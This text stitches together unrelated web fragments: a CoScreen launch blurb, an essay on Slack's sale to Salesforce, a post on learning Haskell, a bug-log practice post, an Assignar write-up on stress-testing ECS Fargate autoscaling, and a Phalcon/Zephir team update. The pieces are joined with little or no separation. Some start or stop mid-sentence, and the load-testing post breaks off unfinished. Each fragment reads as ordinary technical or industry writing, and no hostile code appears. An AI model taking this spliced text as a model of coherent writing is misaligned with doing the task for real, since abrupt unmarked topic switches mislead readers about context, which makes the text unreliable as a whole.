You can think of it like a shared desktop where any user can interact with any shared window as if it were their own via remote mouse and keyboard to allow them to collaborate like never before (they can even copy and paste code across windows of different users).</p><p>In addition to built-in video chat, and remote control, we're also launching <a href="https://coscreen.co/slack">a Slack integration</a> so that you can embed CoScreen into your daily workflow. Integrations with VS Code and other IDEs will follow soon.</p><p>CoScreen enables pair/mob/team programming like no other solution and we believe it can reduce the <a href="https://blog.rescuetime.com/context-switching">cost of context switching</a> by up to 80% so you can focus on what actually matters - reviewing code, troubleshooting bugs, or building major new features.</p><figure><img src="https://blog.coscreen.co/content/images/2020/09/CoScreen-SevenDegreesOfCollaboration.png" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7a7fd9f-bf5f-440a-9ec5-7b23b15644bf/Screen_Shot_2020-09-14_at_4.20.50_PM.png" srcset="https://blog.coscreen.co/content/images/size/w600/2020/09/CoScreen-SevenDegreesOfCollaboration.png 600w, https://blog.coscreen.co/content/images/size/w1000/2020/09/CoScreen-SevenDegreesOfCollaboration.png 1000w, https://blog.coscreen.co/content/images/2020/09/CoScreen-SevenDegreesOfCollaboration.png 1323w" sizes="(min-width: 1200px) 1200px"><figcaption>CoScreen introduces the 7th degree of team interactivity through multi-user screen sharing &amp; remote control</figcaption></figure><h2 id="how-coscreen-gives-your-more-control-and-keeps-you-save">How CoScreen gives your more control and keeps you save</h2><p>CoScreen uses P2P whenever you and a second participant can connect directly (e.g. when no corporate firewalls or proxies are between the two of you) so none of your window and control data touches our servers.</p><p>Otherwise, up to a dozen participants can collaborate using our enterprise-grade, HIPAA-compatible video infrastructure with hundreds of servers around the globe that run the awesome open-source framework <a href="https://jitsi.org/">Jitsi</a>.

The occasion was <a href="https://www.theverge.com/2016/10/25/13405200/microsoft-teams-slack-competitor-launch">Microsoft’s launch of Teams</a>, a Slack clone that would come bundled with the company’s popular Office 365 suite of products.</p><p>In its letter, Slack warned Microsoft that “Slack is here to stay,” adding: “we’re just getting started.” But the 4 million users it had at the time would increase to just 12 million four years later, while Microsoft — which added Teams to its 365 bundle without increasing the price — <a href="https://www.theverge.com/2020/10/27/21537286/microsoft-teams-115-million-daily-active-users-stats">took Teams from zero to 115 million users</a>. </p><p>That disparity helps to explain why <a href="https://www.nytimes.com/2020/12/01/technology/salesforce-slack-deal.html">Slack sold itself this week to Salesforce</a>. The deal, which values Slack at $27.7 billion on revenues of $833 million over the past year, has largely been greeted with cheers. (Ben Thompson <a href="https://stratechery.com/2020/salesforce-acquires-slack-salesforces-reasoning-salesforces-opportunity/">offers a typically excellent rundown of the opportunity here for both Salesforce and Slack</a>.)</p><p>But it also feels like the end of an era — one where workers gained new power to bring their own tools to the office, and decide for themselves how they wanted to get work done. Slack first succeeded with small teams who wanted to accelerate their work, and was often dragged into organizations by early adopters. But today, waves of consolidation are leaving people with fewer real choices.</p><p>The rise of smart phones in the early 2010s brought with it a new surge of workplace productivity tools that made mincemeat of everything that had come before them. Box and Dropbox brought easy file storage and sharing. Evernote introduced the idea of ubiquitous, cloud-synchronized note-taking. Sunrise created a more social calendar, while Mailbox and Acompli reimagined email for the mobile phone.</p><p>Slack tiptoed into the conversation in the middle of the decade, and almost immediately became the fastest-growing enterprise software tool of all time. In 2015, just 18 months after it launched, <a href="https://www.theverge.com/2015/6/24/8836087/slack-1-million-daily-users">Slack reported having more than 1 million daily users</a> —&nbsp;a figure then unheard-of in enterprise software.</p><p>It had a great backstory —&nbsp;a last-ditch pivot from a failed video game called Glitch —&nbsp;and, in Stewart Butterfield, one of the tech world’s most charming founders. It also had a bold pitch: it was going to “kill email” —&nbsp;or, at the very least, reduce your reliance on it. And it would do so by integrating hundreds of other services into real-time work chat, creating a kind of all-knowing command console for your organization.</p><p>The company embodied the belief, so common in Silicon Valley, that the best product would win in the end. “Building a product that allows for significant improvements in how people communicate requires a degree of thoughtfulness and craftsmanship that is not common in the development of enterprise software,” the company wrote in its open letter to Microsoft. “How far you go in helping companies truly transform to take advantage of this shift in working is even more important than the individual software features you are duplicating.”</p><p>And yet if there’s a lesson of the past four years, it’s that thoughtfulness and craftsmanship only got the company about 10 percent as far as Microsoft did by copy-pasting Slack’s basic design. In its open letter, Slack famously told Microsoft: “You’ve got to do this with love.” In 2020, looking at Slack’s size, the idea seems laughable. What’s love got to do with it?</p><p>The thing is, I <em>hate</em> that this was the outcome for Slack. I love good productivity tools, and was rooting for Slack to someday become as good as the company hyped it up to be. (And perhaps it still will: like most giants Salesforce has a mixed track record when it comes to the success of its acquisitions, but some seem to be thriving. When I asked about this on Twitter, people had <a href="https://twitter.com/caseynewton/status/1333891286185644032?s=21">a lot of good things to say about post-acquisition Heroku</a>.)</p><p>But Slack’s struggle to succeed as an independent company sadly mirrors that of many one-time innovators in enterprise productivity. Mailbox died and Acompli sold to Microsoft, where it became the mobile Outlook app. Evernote is a pale shadow of its former self. Of that early cohort, only Box and Dropbox became — and still remain —&nbsp;public companies.</p><p>Why is this the case? To get some insight, I called up Aaron Levie, Box’s affable CEO. In Levie’s telling —&nbsp;and he also wrote <a href="https://blog.box.com/salesforce-slack-and-future-work">a blog post about the Slack sale</a> — it all comes down to sales. The idea that workers would someday choose all their own tools was always a fantasy, he told me, in part because most workers don’t event want to think about their tools. In such a world, the winning app will almost always be one with a giant, er, salesforce behind it. </p><p>Microsoft had one. Slack didn’t. Enter Salesforce.</p><p>“The reality with the enterprise is that you can have the best product, but that’s not good enough,” Levie told me. “You need distribution. And what Salesforce has — they have the procurement officers, they have the finance people. They have all of the apparatus you need to interact with to sell software, and they have it for the top 100,000 corporations around the world.”</p><p>Levie is bullish on the acquisition, because it puts Slack and Salesforce on more even ground. </p><p>“The only advantage Microsoft has is distribution, and so now they’ve neutralized the advantage that Microsoft has had,” he said. “All of a sudden, they can actually fulfill the ultimate promise of the opportunity, because they have 10 times the amount of salespeople that can go distribute this thing into corporations around the world.”</p><p>Assuming Levie is right — and I wouldn’t bet against him — that means the medium-term future of work is increasingly a choice between three giants: Microsoft, Salesforce, and (in a distant third) Google. And with that, the golden age of worker choice in productivity tools seems to be coming to an end.</p><p>That’s not to say that the incumbents won’t always face new challengers. But I wonder whether the low ceiling that Slack turned out to have has implications for some of the other fast-growing productivity companies of the current moment. Should Slack’s sale diminish our expectations for Airtable, or Notion, or Coda? Don’t get me wrong — I’m confident their investors will all get their money back, and then some. But do they have a real future outside the arms of a monolith?</p><p>If not, then the productivity market will become as consolidated as any number of other spaces on the internet, from app stores to search engines to social networks. And as our government antitrust regulators begin to awaken after a long period of hibernation, I wonder if they’ll have anything to say about it.</p><h3>The Ratio</h3><p><em>Today in news that could affect public perception of the big tech companies</em></p><p>⬆️ <strong>Trending up</strong>: <strong><a href="https://techcrunch.com/2020/12/02/google-news-showcase-paywalled-stories/">Google</a></strong><a href="https://techcrunch.com/2020/12/02/google-news-showcase-paywalled-stories/">’s new paid deals with publishers mean that access to some paywalled content will now be available to readers for free</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>When I started my first full-time job as a software engineer out of college, I frequently had discussions with my fellow new-hires about our technical adventures up to that point. At one point, two of them mentioned something called a “monad” and went back and forth about it for a few minutes. My first thought was:</p>

<blockquote>
  <p>“Monad?? What is a monad? Am I supposed to know what that is?!”</p>
</blockquote>

<p>I remember just nodding along as I had this conversation in my head. The first thing I did when I got back to my desk was search “What is a monad”, as any curious programmer would. I was greeted with a plethora of articles, all of which made me scratch my head after reading. I had to get back to work but I decided to bookmark a few more articles and continue later. Safe to say the proverbial can of worms was opened.</p>

<p>I fondly remember this moment as the beginning of my foray into functional programming (I had a grand total of 2-3 weeks of scheme in college so I don’t count that). Up until now I had primarily programmed in C/C++, Python, Javascript, and some Go. Somehow I had escaped the pull of functional programming languages until then, and I’ve been spending a lot of my free time learning functional programming paradigms since that moment. I wouldn’t dare try to explain what a monad is in my inaugural post on functional programming, but I do hope to explain a bit about why I’m so excited to learn more about functional programming and how I think it will help me as a software engineer.</p>

<h3 id="what-is-a-functional-language">What is a Functional language?</h3>

<p>A very small number of companies actually use functional languages in a professional capacity, so how could learning about them help me? To answer that I think it would help to agree on some of the central tenants of functional programming.</p>
<ul>
  <li>One of the core principles of functional languages that stuck with me right away is that you cannot mutate data once it has been created. Instead of directly mutating the data like you would in an imperative language like C++, you just make a fresh copy with the desired update. This is also referred to as stateless programming. One benefit of stateless programming is that you do not have to worry about multiple threads modifying the same data because each thread gets its own copy.</li>
  <li>Referential transparency essentially means that you can replace an expression with its result. So instead of <code>1+2</code> you could simply write <code>3</code>. That’s a trivial example, but where it becomes more interesting is with functions. With referential transparency you don’t have to worry about the function producing side effects or mutating some global state that affects other parts of the program. You can legitimately replace the function call (an expression) with its result and be done. Functions are also repeatable which means they don’t depend on external state themselves. Some other phrases thrown around when describing functional programming languages are “pure” and “no side effects”, and I think referential transparency encapsulates both of those. This contrasts with imperative languages because if I call a function <code>foo()</code> in C++, I have no way of knowing if it updated some global state! It’s not always true that I can replace <code>foo()</code> with it’s return value and expect the program to behave the same way.</li>
  <li>Another major characteristic of functional programming is the fact that functions are first order citizens. Many object-oriented languages have begun to add this to their feature set, but higher-order functions are rooted in functional programming. This means you can do things like pass functions into other functions, receive new functions as the result of a different function call, and create anonymous functions (also known as closures). When we create a closure, we create a function on the spot and capture some data that we’d like to use in the function. This is useful because we can then pass that closure (which is just a function) into other functions and it will always have the data it originally captured to perform its task. For example, these constructs allow a language to implement the <code>map</code> function, which applies a function <code>f</code> to each element in a collection - you can’t do that without sending <code>f</code> in as an argument to <code>map</code>. In this case <code>f</code> could be a function we’ve already defined or it could be a closure we just created with some extra data. This provides an incredible amount of flexibility that I’m only beginning to understand how to wield!</li>
</ul>

<p>This is not an exhaustive list, these are just the main concepts I think about when it comes to functional programming. The more I program in functional languages, the more I am learning about the implications of each of these principles as well as other core tenants of functional programming. Later in this post I’ll highlight how even just a surface level exposure to these principles has positively impacted my day job.</p>

<h3 id="learning-a-functional-language">Learning a Functional Language</h3>

<p>After reading about functional programming and how great it is, I just had to try it out! There are plenty of languages to choose from, but I decided to go with Haskell mostly because it’s a pure functional language (as opposed to impure functional languages, which support imperative style programming). I figured if I’m going to start learning I might as well go with the “most” functional one. I’m still not sure if that was the best decision or not but I don’t think it matters very much!</p>

<p>The first thing I realized is that the learning curve is pretty steep. I started by going through <a href="http://book.realworldhaskell.org/">Real World Haskell</a> and <a href="http://dev.stephendiehl.com/hask/index.html">What I Wish I Knew When Learning Haskell</a>, among others. After getting through the basics, I started to get a little overwhelmed. I knew this was going to be different and I was excited for that, but I was utterly shocked at how many words I was reading for the first time! In my <a href="https://bitsbybrad.com/2020-09-29-learning-rust/">last post</a> I wrote briefly about how I learned Rust. I think part of the reason I was so shocked is because I was able to feel comfortable in Rust quickly. It has a similar syntax to C++ and other imperative languages I have used so it was not a huge adjustment. Additionally, there were only a few genuinely new concepts that I had not heard of before. Contrast this to Haskell where I felt like there were only a few concepts that I <em>did</em> recognize. I (naively) was not expecting that after ~6 years of programming, but hey that’s why I fell in love with coding in the first place!</p>

<p>Despite my struggles, I continued to read and write Haskell code. I firmly believe that learning new ways to solve the same problem can open your eyes and give you fresh perspectives which generally improve your problem solving abilities. I experienced this when learning Rust, and even though I am starting from scratch when it comes to functional programming and Haskell I have already noticed how it influences the way I write C++ code.</p>
<ul>
  <li>After spending just a brief amount of time coding in Haskell, I now know what it feels like to truly have no global state. Now, C++ obviously doesn’t enforce these rules like Haskell does, but having that experience has encouraged me to incorporate it into the way I write C++. Instead of a class method using a member variable to manipulate state, I may try to create a struct for inputs and a struct for outputs so each function call is acting on a separate piece of data. This allows me to run the code in parallel much more confidently. This is a huge plus for me since I deal with a lot of multithreaded code!</li>
  <li>I also have a new-found appreciation for const-correctness due to having truly immutable data in Haskell. It’s very helpful to think about whether or not you expect data to be modified in each C++ function and mark it as <code>const</code> accordingly. It’s not always obvious when variables are modified, so it’s much better to put that burden on the compiler.</li>
</ul>

<p>Granted, these may be habits I’d learn to gravitate towards anyway as I write more C++ code, but using a language that places such a strong emphasis on core tenants such as immutable data was a strong motivator to start incorporating them myself.</p>

<h3 id="whats-the-catch">What’s the catch?</h3>

<p>After being introduced to functional programming, it seemed to be some sort of silver bullet that should be used for everything. I started asking myself a question that you’re probably wondering right now:</p>

<blockquote>
  <p>If functional programming is so great, why doesn’t everyone use it?</p>
</blockquote>

<p>As with anything, there are trade offs. For instance, in the example above when I mentioned creating input/output structs instead of using class member variables to pass between functions, I’m trading conciseness and a stronger thread-safety guarantee for space. If my function inputs or outputs are very large, it may be too costly to create fresh copies of the data structure on each invocation of the function based on the time and space constraints.</p>

<p>The main issue is that it’s impossible to do anything of value without having <em>some</em> side effects. Printing to the console, reading/writing to a socket, and creating a file are all forms of side effects. It seems to me that there is a sweet spot between a fully pure language and a language that can handle side effects, and therefore produce business value. Perhaps that sweet spot has not yet been found by many companies, which could explain why functional programming has not yet gained a foothold in the corporate world.</p>

<h3 id="conclusion">Conclusion</h3>

<p>Despite the drawbacks outlined above, I’m optimistic about functional programming, and I think it’s only going to become more relevant. I’m excited to “start from scratch” with something brand new. Reading Greg Michaelson’s <a href="https://www.amazon.com/Introduction-Functional-Programming-Calculus-Mathematics/dp/0486478831">Introduction to Functional Programming through Lambda Calculus</a> and Bartosz Milewski’s <a href="https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/">Category Theory For Programmers</a> are providing plenty of difficult, new topics to think about while I program. It’s going to take a while to feel comfortable but I hope to write about more specific topics in the future and how they make me a better programmer. Thanks for reading!</p>

<span>Photo by <a target="_blank" href="https://www.pexels.com/@negativespace">Negative Space</a></span></p><p><br>When creating software, you’ll make mistakes. Sometimes they’ll be huge, sometimes they’ll be small but you can always learn from them if you spend some extra time documenting them.</p><p>After working for more 10 years as a software engineer I’ve realized it doesn’t change. You might develop some techniques to prevent some from happening but others will show up, it never ends.</p><p>In order to learn from those mistakes and try to avoid them in the future you can develop a bug log. We’ll see here what that is and how it works but I promise it helps.</p><p>I recently introduced this idea at <a href="https://buffer.com/">Buffer</a> where I’ve been working for almost 5 years now and I thought it’d be cool to share it publicly here as well.</p><h2 id="the-endless-cycle-of-software-development">The (endless) cycle of software development</h2><pre><code>1. Work on a new feature
2. Fix bug(s)
3. Go back to 1.
</code></pre><p>Sometimes you might focus on only developing new features or only fixing bugs but those are the biggest chunks of your work if you’re building software.</p><p>I think we focus a lot on the how to develop more effectively new features: using the latest framework, text editor or IDE, a new programming paradigm, etc. and when we build something new again, we try to apply the things we’ve learnt and improve.</p><p>On the other hand, when we fix a bug, we tend to do it as quick as possible and then move on to something else, almost like it didn’t happen in the first place. Very few people spend any time trying to learn new debugging techniques instead of learning the latest framework that came out.</p><p>If we spent more time reflecting on those errors, learning from them and understanding where they came from we could improve a lot.</p><h2 id="documenting-a-personal-mistake">Documenting a personal mistake</h2><p>I’ve started to document those bugs, only the ones where I was the only engineer who did it so I can totally understand the context and reflect on what I personally did.</p><p>There are many different ways to do this, but I thought it’d be cool to have one place where I can gather all of them and search in the future for references and patterns. I don’t know if the term already exist but I called it the “bug log”. 🤷‍♂️ 😅</p><h2 id="what-s-a-bug-log">What’s a bug log?</h2><p>A bug log is a collection of your past introduced bugs with different sections for each bug:</p><ul><li>The context where the bug was introduced and what you were trying to achieve (fixing another bug, adding a new feature, etc).</li><li>Why the bug happened. What was wrong in production that made you realize that there was a bug.</li><li>How you fixed it.</li><li>The lesson you learned afterwards. A summary of what you’ve learned in the process.</li></ul><p>These sections are the ones that work for me, but feel free to adapt them to your needs if you want to start a bug log.</p><h2 id="an-example-of-an-entry-in-the-bug-log">An example of an entry in the bug log</h2><div><pre><code data-lang="md"><span># Context
</span><span></span>When working on this JIRA ticket ____, trying to track an action on the backend,
I merged the pull request and it failed in production in a certain environment.

<span>-</span> Link to ticket: ....
<span>-</span> Link to pull request: ....

<span># Why the bug happened
</span><span></span>The environment variable was not set in one of the environments and that caused
an error in production.

<span># How I fixed it.
</span><span></span>I created the new environment variable by doing X and Y.

<span># Lesson learned.
</span><span></span>When using an environment variable make sure it's available in all the environments
before deploying.</code></pre></div><p>As you can see it’s not anything formal and it’s just for you so feel free to use the format and tone that makes the most sense.</p><p>The nice aspect about this is that if I see this becomes a pattern like if I introduced more than one bug of this type in the next year or so, I can work on a better solution. For example, a parser that compares the env. variables used in a new pull request with the ones that are in production.</p><h2 id="where-do-i-store-the-bug-log">Where do I store the bug log?</h2><p>I’ve become a big fan of <a href="https://notion.so/">Notion</a> and I’ve added it there so other team members can see it but it could be anywhere, any note-taking app or even a Github repo with some markdown files could work.</p><h2 id="what-to-do-with-the-lesson-learned-sections">What to do with the “lesson learned” sections?</h2><p>Something I’ve realized is that by summarizing in one sentence the bug I introduced and why I can easily reflect and learn the lesson. I’ve taken one extra step to not forget it for the future so I use <a href="https://apps.ankiweb.net/" target="_blank">Anki</a>, a solution for reviewing cards from time to time, helping you learn what’s in the card.</p><p>I used it before for other purposes but I created a new collection for this. What I do is creating a card whose front is the situation I faced when I introduced the bug and the back is the lesson learned. For example, here it’d be:</p><pre><code>Front
--------
What should I do when I use an environment variable in the code?

Back
--------
Check by doing X/Y if it's set in the right environments.
</code></pre><p>Here’s how it looks in Anki:</p><p><img src="https://josemdev.com/images/anki-bug-log.png" alt="Anki Bug Log" title="Anki Bug Log"></p><p>This will reinforce my learning and it’s easier that I remember it in the future. It can also include some code samples so you associated the situation to new code that you’ll be modifying in the future.</p><p>I’m a big fan of <a href="https://apps.ankiweb.net/" target="_blank">Anki</a> and how it can help you improve as an engineer so I’ll write an article about it soon.</p><p>The other thing I do is before filling a new entry, I can try to search in the log something similar. Sometimes that helps me understand if I tend to make the same kind of mistakes.</p><p><br>I hope this was useful to you! Do you have any thoughts or feedback? Let me know <a href="https://twitter.com/gilgado_">on Twitter</a>! 😉</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Understanding the expected performance of a system is essential for maintaining service levels of the system. Using the AWS solution, <a href="https://aws.amazon.com/solutions/implementations/distributed-load-testing-on-aws/" target="_blank" rel="noopener noreferrer">Distributed Load Testing</a>, we were able to test one of our latest features on Amazon ECS Fargate without the hassle of setting up a test harness, and managed to find a bug in our scaling policy during the process.</p><h2>Introduction</h2><p>In a traditional <a href="https://www.bmc.com/blogs/n-tier-architecture-tier-2-tier-3-and-multi-tier-explained/" target="_blank" rel="noopener noreferrer">three-tier web architecture</a>, Web, Application and Data Tiers all reside on separate dedicated servers. Usually there's at least two servers in each of these tiers for <a href="https://en.wikipedia.org/wiki/High-availability_application_architecture" target="_blank" rel="noopener noreferrer">geographic diversity and high availability</a>. With these servers comes operational complexity, and an operational burden to deploy, monitor, operate and upgrade.</p><p><img alt="Three tier application" src="https://techblog.assignar.com/assets/images/3-tier-96e15b6d03c6c22c1e4f70def467e7ba.png"></p><p>Running applications on Amazon ECS Fargate with the Amazon ALB is a great way to <a href="https://docs.aws.amazon.com/whitepapers/latest/microservices-on-aws/serverless-microservices.html" target="_blank" rel="noopener noreferrer">reduce operational complexity</a> by removing the need to manage any servers. At Assignar, where possible we operate on serverless technologies like AWS Lambda and AWS Fargate which allows us to focus on the product and reduce our operational costs. In most cases, our services look very similar to typical three-tier applications, only serverless. These smaller three-tier services (micro-services) interact to form a distributed system.</p><p>An important step for managing this distributed system, or any distributed system, serverless or not, is to understand when services become <a href="https://landing.google.com/sre/sre-book/chapters/monitoring-distributed-systems/" target="_blank" rel="noopener noreferrer">saturated</a>. One way to understand a service's saturation point is to perform a stress test to measure the capacity and reliability of the system under critical load. The AWS Well-Architected framework outlines a key <a href="https://docs.aws.amazon.com/wellarchitected/latest/reliability-pillar/design-principles.html" target="_blank" rel="noopener noreferrer">design principle</a> to consider when operating reliable systems; <em><strong>Stop guessing capacity</strong></em>. AWS recently released a tool to help with this; <a href="https://aws.amazon.com/solutions/implementations/distributed-load-testing-on-aws/" target="_blank" rel="noopener noreferrer">Distributed Load Testing</a>.</p><h2>Stress Testing</h2><p>We took a two step approach to mesure the saturation point of our service. Step 1, find the breaking point of a single node. Step 2, scale horizontally and find the the breaking point of the entire system. </p><h3>Step 1 - Breaking a Single Node</h3><p>The first and probably most important consideration when performing a stress test or load test is to select some <a href="https://www.webperformance.com/load-testing-tools/blog/2010/09/choosing-the-scenarios-for-a-load-test/" target="_blank" rel="noopener noreferrer">meaningful</a> and <a href="https://loadninja.com/load-testing/" target="_blank" rel="noopener noreferrer">realistic</a> test scenarios. Our test scenario below performs a stress test against one of our expensive GraphQL API operations, which is used to fetch alerts for customers.</p><p>In the <em>Distributed Load Testing</em> web console, we set the target endpoint to our GraphQL HTTP endpoint, the HTTP method to <code>POST</code> and the body of the request to our GraphQL query. We configured the test to ramp from 0 to 100 concurrent requests over 5 minutes. The hold time was configured to hold at 100 concurrent requests for 2 minutes. The node we are testing against is configured with 1 vCPU and 2GB of Memory.</p><p><img alt="Test configuration" src="https://techblog.assignar.com/assets/images/configuration-2efbb9e5327f43f41339c87d5983502b.png"></p><p>With the above configuration, we observed the results below.</p><p><img alt="Load testing results for a single node" src="https://techblog.assignar.com/assets/images/results-21cd9828dd156b1654db76547e7f422f.png"></p><p>Out of 18,886 requests, 5936 (31.5%) were sucessful and 12930 (68.5%) failed. Oberserving the HTTP error codes, 1851 (9.8%) requests were HTTP 502 Bad Gateway server errors. 11079 (58.7%) requests were HTTP 503 Service unavailable server errors. We were able to sustain for around 3 minutes and then performance suddenly dropped off.</p><h4>What happened?</h4><p>At the three minute mark, our Application Load Balancer (ALB) marked our single node as unhealthy as HTTP health checks failed. We can see this in the ECS events:</p><div><div><div tabindex="0"><div><p><span>service alerts (port 80) is unhealthy in target-group alerts-target-group due to (reason Request timed out).</span></p><p><span>service alerts deregistered 1 targets in target-group alerts-target-group</span></p></div></div></div></div><p>Essentially we performed <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank" rel="noopener noreferrer">DDOS attack</a> on our own service. The node's workers were all occupied serving requests and there was no workers available to serve the HTTP health checks. There is further evidence of this in the HTTP 502 errors which indicate requests were not able to communicate with our application backend. When the node was marked as unhealthy it was removed from service. From this point on, we observe HTTP 503 errors from the ALB because there are no nodes available to service requests. </p><p>This is a good indication of the when a single node will become <em>saturated</em>. The <em>saturation</em> point for this API was a continous stream of 60 concurrent requests. This is a fairly low number compared to the <a href="https://wrongsideofmemphis.com/2013/10/21/requests-per-second-a-reference/" target="_blank" rel="noopener noreferrer">load other services can handle</a> which can be attributed to the fact this is one of our most expensive APIs, a <em>worst case</em>. We were limited by the number of workers available on the node. To mitigate this, we could increase the number of workers available to our application server, increasing the capacity and throughput for a single node. We could also consider <a href="https://aws.amazon.com/builders-library/using-load-shedding-to-avoid-overload/" target="_blank" rel="noopener noreferrer">load-shedding</a> to prevent an overload of the node and migitate <em>back pressure</em> of upstream services (a database cluster, for instace).</p><p>However in this case, to maintain availability, we know the <a href="https://docs.aws.amazon.com/wellarchitected/latest/reliability-pillar/design-principles.html" target="_blank" rel="noopener noreferrer">best practice from AWS</a> is to <em><strong>Scale horizontally to increase aggregate workload availability</strong></em>.</p><h3>Step 2 - Scaling Horizontally</h3><p>Before we can perform a stress test on our system with <a href="https://docs.microsoft.com/en-us/azure/architecture/best-practices/auto-scaling" target="_blank" rel="noopener noreferrer">horizontal scaling</a> we need to determine our <em>scaling policy</em>.</p><p>The <a href="https://web.archive.org/web/20161227201811/http://techblog.netflix.com/2012/01/auto-scaling-in-amazon-cloud.html" target="_blank" rel="noopener noreferrer">traditional wisdom for autoscaling</a> is to first determine what resource your workload is bound by, and scale on that. CPU-bound applications should scale on CPU, IO-bound should scale on connections and Memory-bound applications should scale on memory, and so forth. It's not uncommon that your workload might have be constrained by two different resources, and in this case it makes sense to scale on both these resources. This is possible in ECS by using <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/using-metric-math.html" target="_blank" rel="noopener noreferrer">Metric Math</a> to combine data from multiple CloudWatch metrics. An example of using this with ECS can be found <a href="https://marbot.io/blog/cloudwatch-combined-metrics.html" target="_blank" rel="noopener noreferrer">here</a>. A second, newer alternative in AWS is <a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Create_Composite_Alarm.html" target="_blank" rel="noopener noreferrer">CloudWatch composite alarms</a> to combine multiple alarms. The former combines metrics, the latter combines alarms.</p><p>At Assignar, we scale by using Metric Math but include step scaling so that we can <a href="https://docs.microsoft.com/en-us/azure/architecture/guide/design-principles/scale-out" target="_blank" rel="noopener noreferrer">scale aggressively</a> if we encounter unexpected spikes. For our ECS service, we've opted to scale on CPU, Memory utilisation and <code>RequestCountPerTarget</code>.</p><p>I can offer one piece of advice when using multiple metrics to scale; <strong>only have one decision point for scaling</strong>. In other words, do not try and attach multiple scaling polocies to your service. Combine your scaling into a single decision. This eliminates the possibility of <a href="https://en.wikipedia.org/wiki/Thrashing_(computer_science)" target="_blank" rel="noopener noreferrer">thrashing</a>, for example when <em>scale out</em> on CPU brings your average memory utilisation below your <em>scale in</em> threshold, and vice versa.</p><p>With our scaling policy set, we repeated the same stress test as the single node test, 0 to 100 requests ramping up over 5 minutes, which yielded the results below.</p><p><img alt="Load testing results for a multiple nodes" src="https://techblog.assignar.com/assets/images/results-6cb902fbef60838c721231c0076adef1.png"></p><p>We see very similiar behaviour to the single node test, where the response time increases as the load increase, but this time we were able to scale horizontally to handle the increasing load. As a result, in this test, 100% of requests were succesful. We see the following message in the ECS service events, where we scale from 1 to 4 tasks:</p><div><div><div tabindex="0"><div><p><span>Message: Successfully set desired count to 4. Change successfully fulfilled by ecs. Cause: monitor alarm alerts-HighUsageAlarm in state ALARM triggered policy alerts-up</span></p></div></div></div></div><h4>A bug in our scaling policy</h4><p>The first time we performed this stress test, it was surprising to find that scaling did not work as expected. We had a bug into our scaling policy by supplying the incorrect dimensions to our CloudWatch metrics. The metric expects the ALB and Target dimensions to be in the <em>full name</em> format whereas we were supplying these <em>ARN</em> format.</p><p>Incorrect ❌:</p><div><div><div tabindex="0"><div><p><span>            Metric:</span></p><p><span>              Namespace: AWS/ApplicationELB</span></p><p><span>              MetricName: RequestCountPerTarget</span></p><p><span>              Dimensions:</span></p><p><span>                - Name: LoadBalancer</span></p><p><span>                  Value: !Ref ALB</span></p><p><span>                - Name: TargetGroup</span></p><p><span>                  Value: !Ref TargetGroup</span></p></div></div></div></div><p>Correct ✅:</p><div><div><div tabindex="0"><div><p><span>            Metric:</span></p><p><span>              Namespace: AWS/ApplicationELB</span></p><p><span>              MetricName: RequestCountPerTarget</span></p><p><span>              Dimensions:</span></p><p><span>                - Name: LoadBalancer</span></p><p><span>                  Value: !GetAtt ALB.LoadBalancerFullName</span></p><p><span>                - Name: TargetGroup</span></p><p><span>                  Value: !GetAtt TargetGroup.TargetGroupFullName</span></p></div></div></div></div><p>We expected to scale out when the <code>RequestCountPerTarget</code> breached our configured threshold. This was not the case. If not for the stress test, this error likely would not have been caught untill after this feature was released to production, so at minimum stress testing can be useful as a sanity check that the infrastructure is working.</p><h4>Stress testing with horizontal scaling</h4><p>Having a work scaling policy, we now need to do a full stress test of the system system with horizontal scaling enabled. </p><p>For this test, we modifed the ramp up to range from 0 to 800 concurrent requests. An 8x increase of load. The ramp up was also increased from 5 minutes to 20 minutes with a 4 minute hold time. </p><p><img alt="Load testing results for a multiple nodes" src="https://techblog.assignar.com/assets/images/final-results-62fd2458e3891a4029f5ac6b5faed77b.png"></p><p>😱😱😱😱😱😱.</p><p>Under the additional load, only 73% of requests were sucessful, with 27% of requests returning error responses. In addition to 502s and 504s, we now also have 504s and 500s errors being thrown by the application.</p><h4>What happened?</h4><p>We are removing unhealthy nodes faster than we <em>scale out</em> which means there is a war between launching new nodes and removing existing nodes failing health checks. This is causing our application response times to fluctuate in sawtooth pattern, <em>thrashing</em> between error and sucess states. This is reflected in our ECS service statistics we the running count of nodes fluctuates in the same sawtooth pattern.</p><p><img alt="Node Availability" src="https://techblog.assignar.com/assets/images/node-availability-7a9de25876b07886af4e377d028109c6.png"></p><p>In the ECS events, we saw the same error we saw in the single node test, nodes are failing health checks.</p><div><div><div tabindex="0"><div><p><span>service alerts (port 80) is unhealthy in target-group alerts-target-group due to (reason Request timed out).</span></p><p><span>service alerts deregistered 1 targets in target-group alerts-target-group</span></p></div></div></div></div><p>Our scaling policy is configured to calculate how many nodes to launch each scaling cycle, with a maximum of 3. During the stress test, the scaling policy was recommending we launch 9 nodes, however due to the cap of 3, we are only scaling a third of recommended amount the each scaling cycle. The cap was implemented to help smooth out the scaling curve and prevent overscaling, but in this case it has the opposite …</p></section></div>

                        <p>Unfortunately we were unable to finish the hangout last Friday, due to technical issues. So as promised, here is a summary of the hangout discussion including points we missed.
<!--more--></p>

<h3 id="summer-progress">Summer Progress</h3>
<p>Similar to last year, summer is always slow moving and with the added Covid, the team had to focus on work/family even more.</p>

<p>Nikos had 2 weeks of vacation, the first vacation he had in the last 5 years. well deserved, and really nice to spend time with the family. Ruud and Serghei also had vacations and Anton is getting ready for some time off.</p>

<h3 id="team-changes">Team changes</h3>
<p>Serghei is stepping down and cannot commit time to the project. He needs to concentrate on work and family of course. He was very nice to tell us that he will no longer be able to help - not fooling anyone or offering promises that he might not be able to keep.</p>

<p>A huge thank you to Serghei. He has learned C/Zephir on his own, trying to help the project as much as possible. He maintained both Phalcon and Zephir during the v3 latter versions, up until the end of 2018, when Nikos stepped up to help with Phalcon.</p>

<p>The team remains dedicated for the project as time permits.</p>

<h3 id="zephir">Zephir</h3>
<p>Now that Serghei has stepped down, we have an issue with Zephir. We no longer have any active maintainers for the project to assume the lead and help with development/bugs etc.</p>

